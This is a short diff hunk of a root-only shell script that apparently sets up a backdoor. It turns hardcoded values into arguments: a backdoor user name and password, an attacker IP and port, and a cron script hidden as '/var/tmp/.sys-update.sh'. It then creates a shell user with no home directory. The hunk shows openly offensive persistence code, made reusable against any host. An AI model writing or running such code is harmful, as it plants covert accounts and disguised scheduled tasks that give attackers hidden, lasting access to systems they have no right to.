@@ -13,11 +13,11 @@ if [ "$(id -u)" -ne 0 ]; then
   exit 1
 fi
 
-USER_NAME="backd"
-USER_PASS="password"
-ATTACK_IP="192.168.3.16"
-ATTACK_PORT="4567"
-CRON_SCRIPT_PATH="/var/tmp/.sys-update.sh"
+USER_NAME="$1"
+USER_PASS="$2"
+ATTACK_IP="$3"
+ATTACK_PORT="$4"
+CRON_SCRIPT_PATH="$5"
 
 # Create user with no home, no group, bash shell
 useradd -M -N -s /bin/bash "$USER_NAME"
